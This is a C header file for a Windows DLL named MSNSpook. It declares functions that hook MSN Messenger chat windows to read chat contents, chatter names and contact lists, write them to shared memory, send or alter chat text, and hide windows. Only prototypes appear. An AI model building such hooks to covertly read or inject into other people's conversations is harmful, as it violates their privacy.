
// The following ifdef block is the standard way of creating macros which make exporting 
// from a DLL simpler. All files within this DLL are compiled with the MSNSPOOK_EXPORTS
// symbol defined on the command line. this symbol should not be defined on any project
// that uses this DLL. This way any other project whose source files include this file see 
// MSNSPOOK_API functions as being imported from a DLL, wheras this DLL sees symbols
// defined with this macro as being exported.
#ifdef MSNSPOOK_EXPORTS
#define MSNSPOOK_API __declspec(dllexport)
#else
#define MSNSPOOK_API __declspec(dllimport)
#endif


// This class is exported from the MSNSpook.dll
// This class is exported from the MSNSpook.dll
// External function prototypes

//Hook Part
//The Second Chat Window Will Not Set A New Hook!!!!
MSNSPOOK_API BOOL WINAPI InitMSNSpook(HWND hChatHwnd);
MSNSPOOK_API BOOL WINAPI ExitMSNSpook(HWND hChatHwnd);

MSNSPOOK_API HWND WINAPI MSNSpookGetChatWindowHandle(DWORD dwIndex);

//Note: szChatterName must be long enough to hold the chatter name
//it is the name of who are chat with you
MSNSPOOK_API BOOL WINAPI MSNQueryChatterPersonName(LPCTSTR szChatterName, DWORD dwChatIndex);

//dwChatIndex is the Active Chat Number
MSNSPOOK_API BOOL WINAPI MSNQueryChatContents(DWORD dwChatIndex);
MSNSPOOK_API BOOL WINAPI MSNQueryContactList();
MSNSPOOK_API BOOL WINAPI MSNSendChatText(LPCTSTR szText, 
									  BOOL bClearPreviosText, BOOL bSendTextImmediately, DWORD dwChatIndex);
MSNSPOOK_API BOOL WINAPI MSNSetChatterPersonName(LPCTSTR szChatterName, DWORD dwChatIndex);
MSNSPOOK_API BOOL WINAPI MSNQueryContactList();

MSNSPOOK_API BOOL WINAPI MSNShowChatWindow(BOOL bShow);
MSNSPOOK_API BOOL WINAPI MSNDestroyMainWindow(HWND hWnd);

void MSNCheckRichEdit();
BOOL MSNEnumRichEdit(HWND hChatHwnd, DWORD dwChatIndex);

//Read Contents of RichEdit, and Write To MMF
BOOL MSNInnerRichEditSaveText(HWND hRichEditWnd, DWORD dwChatIndex);

//Get Hooked Chat Number
DWORD MSNSpookGetChatNumber();
//Insert hChatWnd into g_hChatWnd and return the Array Index
DWORD MSNSpookInsertChatHwnd(HWND hChatWnd);
//Query hChatWnd's index in g_hChatWnd
DWORD MSNSpookQueryChatHwndIndex(HWND hChatWnd);

BOOL InnerMSNMainSaveContactList(HWND hMSNMain);
